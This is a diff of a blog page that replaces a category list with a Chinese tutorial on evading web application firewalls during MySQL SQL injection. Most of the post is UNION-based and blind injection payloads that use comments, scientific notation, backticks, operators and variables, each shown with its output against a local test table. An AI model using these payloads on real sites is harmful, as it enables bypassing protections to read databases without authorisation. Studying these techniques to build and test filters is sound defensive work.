@@ -86,16 +86,17 @@
 
 
 
-<meta name="description" content="一个兴趣使然的信息安全爱好者">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MaiKeFee|">
-<meta property="og:url" content="http://MaiKeFee.com/categories/渗透测试/知识科普/奇淫技巧/page/2/index.html">
+<meta name="description" content="先准备好用于测试库表及数据:create database injection; use injection; CREATE TABLE IF NOT EXISTS `user`(     `id` INT UNSIGNED AUTO_INCREMENT,     `username` VARCHAR(30) NOT NULL,     `password` VARCHAR(40) NOT NUL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bypasswaf for mysql [数据库层面之特殊字符篇]">
+<meta property="og:url" content="http://MaiKeFee.com/archives/5c55d41e.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="一个兴趣使然的信息安全爱好者">
+<meta property="og:description" content="先准备好用于测试库表及数据:create database injection; use injection; CREATE TABLE IF NOT EXISTS `user`(     `id` INT UNSIGNED AUTO_INCREMENT,     `username` VARCHAR(30) NOT NULL,     `password` VARCHAR(40) NOT NUL">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-09-14T05:21:48.954Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MaiKeFee|">
-<meta name="twitter:description" content="一个兴趣使然的信息安全爱好者">
+<meta name="twitter:title" content="bypasswaf for mysql [数据库层面之特殊字符篇]">
+<meta name="twitter:description" content="先准备好用于测试库表及数据:create database injection; use injection; CREATE TABLE IF NOT EXISTS `user`(     `id` INT UNSIGNED AUTO_INCREMENT,     `username` VARCHAR(30) NOT NULL,     `password` VARCHAR(40) NOT NUL">
 
 
 
@@ -125,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/categories/渗透测试/知识科普/奇淫技巧/page/2/">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/5c55d41e.html">
 
 
 
 
 
-  <title>分类: 奇淫技巧 | MaiKeFee|</title>
+  <title>bypasswaf for mysql [数据库层面之特殊字符篇] | MaiKeFee|</title>
   
 
 
@@ -150,7 +151,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
     
 <a href="https://github.com/MaiKeFee" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
@@ -297,291 +298,425 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block category">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>奇淫技巧<small>分类</small>
-        </h1>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/5c55d41e.html">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MaiKeFee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/MaiKeFee_Logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MaiKeFee|">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/archives/a90cd968.html" itemprop="url">
-              
-                <span itemprop="name">不知道列名的情况下注入</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">bypasswaf for mysql [数据库层面之特殊字符篇]</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:13:43+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-14T13:17:02+08:00">
+                2019-09-14
+              </time>
+            
 
-    </header>
-  </article>
+            
+              <span class="post-meta-divider">|</span>
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-14T13:21:48+08:00">
+                2019-09-14
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/知识科普/" itemprop="url" rel="index">
+                    <span itemprop="name">知识科普</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/知识科普/奇淫技巧/" itemprop="url" rel="index">
+                    <span itemprop="name">奇淫技巧</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/知识科普/奇淫技巧/数据库特性/" itemprop="url" rel="index">
+                    <span itemprop="name">数据库特性</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/archives/5c55d41e.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/5c55d41e.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/archives/5c55d41e.html" class="leancloud_visitors" data-flag-title="bypasswaf for mysql [数据库层面之特殊字符篇]">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  946
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/54ea983c.html" itemprop="url">
-              
-                <span itemprop="name">「木马变形」一句话木马的各种变形</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:11:15+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
+        <h1 id="先准备好用于测试库表及数据"><a href="#先准备好用于测试库表及数据" class="headerlink" title="先准备好用于测试库表及数据:"></a>先准备好用于测试库表及数据:</h1><pre><code>create database injection;
+use injection;
+CREATE TABLE IF NOT EXISTS `user`(
+    `id` INT UNSIGNED AUTO_INCREMENT,
+    `username` VARCHAR(30) NOT NULL,
+    `password` VARCHAR(40) NOT NULL,
+    `email` VARCHAR(40) NOT NULL,
+    PRIMARY KEY ( `id` )
+    )ENGINE=InnoDB DEFAULT CHARSET=utf8;
+insert into user(username,password,email) values(&apos;gentoo&apos;,&apos;superman&apos;,&apos;sec@rootkit.org&apos;);
+insert into user(username,password,email) values(&apos;arch&apos;,&apos;welcome&apos;,&apos;lin@hook.org&apos;);
+insert into user(username,password,email) values(&apos;admin&apos;,&apos;loginpass&apos;,&apos;xlion@priv.org&apos;);</code></pre><h2 id="测试表数据"><a href="#测试表数据" class="headerlink" title="测试表数据:"></a>测试表数据:</h2><pre><code>mysql&gt; select * from user;
++----+----------+-----------+-----------------+
+| id | username | password  | email           |
++----+----------+-----------+-----------------+
+|  1 | gentoo   | superman  | sec@rootkit.org |
+|  2 | arch     | welcome   | lin@hook.org    |
+|  3 | admin    | loginpass | xlion@priv.org  |
++----+----------+-----------+-----------------+</code></pre><h2 id="测试表结构"><a href="#测试表结构" class="headerlink" title="测试表结构:"></a>测试表结构:</h2><pre><code>mysql&gt; desc user;
++----------+------------------+------+-----+---------+----------------+
+| Field    | Type             | Null | Key | Default | Extra          |
++----------+------------------+------+-----+---------+----------------+
+| id       | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
+| username | varchar(30)      | NO   |     | NULL    |                |
+| password | varchar(40)      | NO   |     | NULL    |                |
+| email    | varchar(40)      | NO   |     | NULL    |                |
++----------+------------------+------+-----+---------+----------------+</code></pre><h1 id="mysql中的一些特殊字符利用"><a href="#mysql中的一些特殊字符利用" class="headerlink" title="mysql中的一些特殊字符利用:"></a>mysql中的一些特殊字符利用:</h1><h2 id="最常见的内联注释"><a href="#最常见的内联注释" class="headerlink" title="最常见的内联注释:"></a>最常见的内联注释:</h2><pre><code>mysql&gt; select username,password,email from user where id=-1 union/**/(select/*!*/!.1,(select/*!50000*/schema_name from information_schema.schemata limit 0,1),2) ; -- +
++----------+--------------------+-------+
+| username | password           | email |
++----------+--------------------+-------+
+| 0        | information_schema | 2     |
++----------+--------------------+-------+</code></pre><h2 id="利用科学计数"><a href="#利用科学计数" class="headerlink" title="利用科学计数:"></a>利用科学计数:</h2><pre><code>mysql&gt; select username,password,email from user where id=-11e1union/**/select+null,null,null ;-- -
++----------+----------+-------+
+| username | password | email |
++----------+----------+-------+
+| NULL     | NULL     | NULL  |
++----------+----------+-------+</code></pre><h2 id="利用加减号特性"><a href="#利用加减号特性" class="headerlink" title="利用加减号特性:"></a>利用加减号特性:</h2><pre><code>mysql&gt; select username,password,email from user where id=-1 union/*!*/select+null,-null,/*!null*/ ;-- -
++----------+----------+-------+
+| username | password | email |
++----------+----------+-------+
+| NULL     | NULL     | NULL  |
++----------+----------+-------+
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+mysql&gt; select username,password,email from user where id=-1 union (select+1,+(select+schema_name/**/from/*!*/information_schema.schemata/**/limit 0,1),2);
++----------+--------------------+-------+
+| username | password           | email |
++----------+--------------------+-------+
+| 1        | information_schema | 2     |
++----------+--------------------+-------+</code></pre><h2 id="利用反引号特性"><a href="#利用反引号特性" class="headerlink" title="利用反引号特性:"></a>利用反引号特性:</h2><pre><code>mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select+1,+(select+`schema_name`/**/from/*!*/information_schema.schemata/**/limit 0,1),2);
++----------+--------------------+-------+
+| username | password           | email |
++----------+--------------------+-------+
+| 1        | information_schema | 2     |
++----------+--------------------+-------+</code></pre><h2 id="利用破折号特性-适合用在盲注中"><a href="#利用破折号特性-适合用在盲注中" class="headerlink" title="利用破折号特性,适合用在盲注中:"></a>利用破折号特性,适合用在盲注中:</h2><pre><code>mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select~1,(select(schema_name)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);
++----------------------+--------------------+-------+
+| username             | password           | email |
++----------------------+--------------------+-------+
+| 18446744073709551614 | information_schema | 2     |
++----------------------+--------------------+-------+</code></pre><h2 id="利用-特性"><a href="#利用-特性" class="headerlink" title="利用 ! 特性:"></a>利用 ! 特性:</h2><pre><code>mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select~1,!(select(schema_name)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);
++----------------------+----------+-------+
+| username             | password | email |
++----------------------+----------+-------+
+| 18446744073709551614 | 1        | 2     |
++----------------------+----------+-------+</code></pre><h2 id="利用-特性-1"><a href="#利用-特性-1" class="headerlink" title="利用 @ ``特性:"></a>利用 @ ``特性:</h2><pre><code>mysql&gt; select username,password,email from user where id=-11e1union/*!*/(select~1,!(select(@`schema_name`)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);
++----------------------+----------+-------+
+| username             | password | email |
++----------------------+----------+-------+
+| 18446744073709551614 | NULL     | 2     |
++----------------------+----------+-------+</code></pre><h2 id="利用-特性-2"><a href="#利用-特性-2" class="headerlink" title="利用 . 特性:"></a>利用 . 特性:</h2><pre><code>mysql&gt; select username,password,email from user where id=.1union/*.1*/(select/**/1,(select(@`schema_name`)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);
++----------+----------+-------+
+| username | password | email |
++----------+----------+-------+
+| 1        | NULL     | 2     |
++----------+----------+-------+</code></pre><h2 id="利用单双引号特性"><a href="#利用单双引号特性" class="headerlink" title="利用单双引号特性:"></a>利用单双引号特性:</h2><pre><code>mysql&gt; select username,password,email from user where id=.1union/*.1*/(select/**/&apos;1&apos;,(select(&quot;schema_name&quot;)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);
++----------+-------------+-------+
+| username | password    | email |
++----------+-------------+-------+
+| 1        | schema_name | 2     |
++----------+-------------+-------+</code></pre><h2 id="利用各种括号特性-如-花括号-小括号-总括号"><a href="#利用各种括号特性-如-花括号-小括号-总括号" class="headerlink" title="利用各种括号特性,如,花括号[小括号,总括号]:"></a>利用各种括号特性,如,花括号[小括号,总括号]:</h2><pre><code>mysql&gt; select username,password,email from user where id=.1union/*.1*/(select/**/(1),(select(&quot;schema_name&quot;)/**/from/*!*/information_schema.schemata/**/limit 0,1),2);
++----------+-------------+-------+
+| username | password    | email |
++----------+-------------+-------+
+| 1        | schema_name | 2     |
++----------+-------------+-------+</code></pre><h2 id="利用后向引用对付拦截-union-select-from"><a href="#利用后向引用对付拦截-union-select-from" class="headerlink" title="利用后向引用对付拦截 union+select+from:"></a>利用后向引用对付拦截 union+select+from:</h2><pre><code>mysql&gt; select username,password,email from user where id=-1|@sel:=(select schema_name from information_schema.schemata limit 0,1)/*!50000union*//*!50000*//*!50000select*/ 1,@sel,2;
++----------+--------------------+-------+
+| username | password           | email |
++----------+--------------------+-------+
+| 1        | information_schema | 2     |
++----------+--------------------+-------+</code></pre><h2 id="单独拦截select的情况"><a href="#单独拦截select的情况" class="headerlink" title="单独拦截select的情况:"></a>单独拦截select的情况:</h2><pre><code>mysql&gt; select username,password,email from user where id=-11e12union/*!50000select distinctrow*/+version(),+database(),user();
++------------+-----------+----------------+
+| username   | password  | email          |
++------------+-----------+----------------+
+| 5.7.17-log | injection | root@localhost |
++------------+-----------+----------------+</code></pre><h2 id="拦截select-和-from-之间有特殊字符的情况-这种情况比较适合盲注"><a href="#拦截select-和-from-之间有特殊字符的情况-这种情况比较适合盲注" class="headerlink" title="拦截select 和 from 之间有特殊字符的情况,这种情况比较适合盲注:"></a>拦截select 和 from 之间有特殊字符的情况,这种情况比较适合盲注:</h2><pre><code>mysql&gt; select if((select 4,\N) &gt; (select 2,\N),30,20);
++-----------------------------------------+
+| if((select 4,\N) &gt; (select 2,\N),30,20) |
++-----------------------------------------+
+|                                      30 |
++-----------------------------------------+
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/2db90a41.html" itemprop="url">
-              
-                <span itemprop="name">「前端钓鱼欺骗」前端黑魔法之远程控制地址栏</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:09:37+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/a5b396d3.html" itemprop="url">
-              
-                <span itemprop="name">Hashpump实现哈希长度扩展攻击</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:08:57+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/c26c2571.html" itemprop="url">
-              
-                <span itemprop="name">PHP弱类型之md5_tips(ctf经常用到PHP弱类型)</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:08:21+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/e83f08e9.html" itemprop="url">
-              
-                <span itemprop="name">Mimikatz 使用Tips</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:03:46+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/d7cf94f6.html" itemprop="url">
-              
-                <span itemprop="name">Windows命令执行漏洞技巧</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:02:59+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/8946a683.html" itemprop="url">
-              
-                <span itemprop="name">LFI_SSH日志</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:02:15+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/7bcebf52.html" itemprop="url">
-              
-                <span itemprop="name">WAF是如何被绕过的？SQL注入常见手法解密。</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:01:48+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/18ca0ec6.html" itemprop="url">
-              
-                <span itemprop="name">Linux通配符绕过文件名黑名单</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T22:39:51+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+mysql&gt; select username,password,email from user where id=-1 union select if((select length(schema_name),\Nfrom information_schema.schemata limit 1) &gt; (select 1,\N),110,0),2,3;
++----------+----------+-------+
+| username | password | email |
++----------+----------+-------+
+| 110      | 2        | 3     |
++----------+----------+-------+</code></pre><h2 id="灵活配合利用各类空白符-注释符"><a href="#灵活配合利用各类空白符-注释符" class="headerlink" title="灵活配合利用各类空白符,注释符:"></a>灵活配合利用各类空白符,注释符:</h2><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符:"></a>注释符:</h3><pre><code>--
+-- -
+--+
+/**/
+/*!*/
+/*!50000*/
+......</code></pre><h3 id="空白符"><a href="#空白符" class="headerlink" title="空白符:"></a>空白符:</h3><pre><code>09 0A 0B 0C 0D A0 20 .....</code></pre><blockquote>
+<p>一点小结:</p>
+</blockquote>
+<blockquote>
+<p>说实话,指望单一的技巧其实是很难bypass掉现在的waf的,把前辈们的思路和技巧变着法的灵活配合起来,才有可能达到想要的效果,bypasswaf也确实是一个比较漫长的过程,因为需要你不断的去发掘各种新的一些偏门的可利用的数据库,前端脚本,http协议及各类web中间件的特性,当然啦,这次仅仅是基于各种数据库层面来说,来日方长,我们后面还会有大量的篇幅来说这个东西,今天只是先打个照面,混个脸熟…</p>
+</blockquote>
+<p>文章来源:</p>
+<pre><code>https://klionsec.github.io/2017/07/31/bypasswaf-on-database/</code></pre>
       
     </div>
+    
+    
+    
+   <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束❤感谢阅读-------------</div>
+    
+</div>
+    
+ </div>
+     <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+
+  <p><span>本文标题:</span>bypasswaf for mysql [数据库层面之特殊字符篇]</p>
+  <p><span>文章作者:</span>MaiKeFee</p>
+  <p><span>发布时间:</span>2019年09月14日</p>
+  <p><span>最后更新:</span>2019年09月14日</p>
+  <p><span>原始链接:</span><a href="/archives/5c55d41e.html" title="bypasswaf for mysql [数据库层面之特殊字符篇]">http://MaiKeFee.com/archives/5c55d41e.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/5c55d41e.html" aria-label="复制成功！"></i></span>
+  </p>
+  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+    
+</div>
+    
+
+    
+
+   
+
+  <footer class="post-footer">
+
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/4289907f.html" rel="next" title="文件隐藏 之 NTFS 交换数据流">
+                <i class="fa fa-chevron-left"></i> 文件隐藏 之 NTFS 交换数据流
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+          
+        </div>
+      
+ 
+      
+      
+    </footer>
 
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/categories/渗透测试/知识科普/奇淫技巧/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/categories/渗透测试/知识科普/奇淫技巧/">1</a><span class="page-number current">2</span><a class="page-number" href="/categories/渗透测试/知识科普/奇淫技巧/page/3/">3</a><a class="extend next" rel="next" href="/categories/渗透测试/知识科普/奇淫技巧/page/3/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -589,6 +724,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -609,8 +751,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -733,6 +884,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#先准备好用于测试库表及数据"><span class="nav-number">1.</span> <span class="nav-text">先准备好用于测试库表及数据:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#测试表数据"><span class="nav-number">1.1.</span> <span class="nav-text">测试表数据:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试表结构"><span class="nav-number">1.2.</span> <span class="nav-text">测试表结构:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mysql中的一些特殊字符利用"><span class="nav-number">2.</span> <span class="nav-text">mysql中的一些特殊字符利用:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#最常见的内联注释"><span class="nav-number">2.1.</span> <span class="nav-text">最常见的内联注释:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用科学计数"><span class="nav-number">2.2.</span> <span class="nav-text">利用科学计数:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用加减号特性"><span class="nav-number">2.3.</span> <span class="nav-text">利用加减号特性:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用反引号特性"><span class="nav-number">2.4.</span> <span class="nav-text">利用反引号特性:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用破折号特性-适合用在盲注中"><span class="nav-number">2.5.</span> <span class="nav-text">利用破折号特性,适合用在盲注中:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用-特性"><span class="nav-number">2.6.</span> <span class="nav-text">利用 ! 特性:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用-特性-1"><span class="nav-number">2.7.</span> <span class="nav-text">利用 @ ``特性:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用-特性-2"><span class="nav-number">2.8.</span> <span class="nav-text">利用 . 特性:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用单双引号特性"><span class="nav-number">2.9.</span> <span class="nav-text">利用单双引号特性:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用各种括号特性-如-花括号-小括号-总括号"><span class="nav-number">2.10.</span> <span class="nav-text">利用各种括号特性,如,花括号[小括号,总括号]:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用后向引用对付拦截-union-select-from"><span class="nav-number">2.11.</span> <span class="nav-text">利用后向引用对付拦截 union+select+from:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#单独拦截select的情况"><span class="nav-number">2.12.</span> <span class="nav-text">单独拦截select的情况:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拦截select-和-from-之间有特殊字符的情况-这种情况比较适合盲注"><span class="nav-number">2.13.</span> <span class="nav-text">拦截select 和 from 之间有特殊字符的情况,这种情况比较适合盲注:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#灵活配合利用各类空白符-注释符"><span class="nav-number">2.14.</span> <span class="nav-text">灵活配合利用各类空白符,注释符:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注释符"><span class="nav-number">2.14.1.</span> <span class="nav-text">注释符:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#空白符"><span class="nav-number">2.14.2.</span> <span 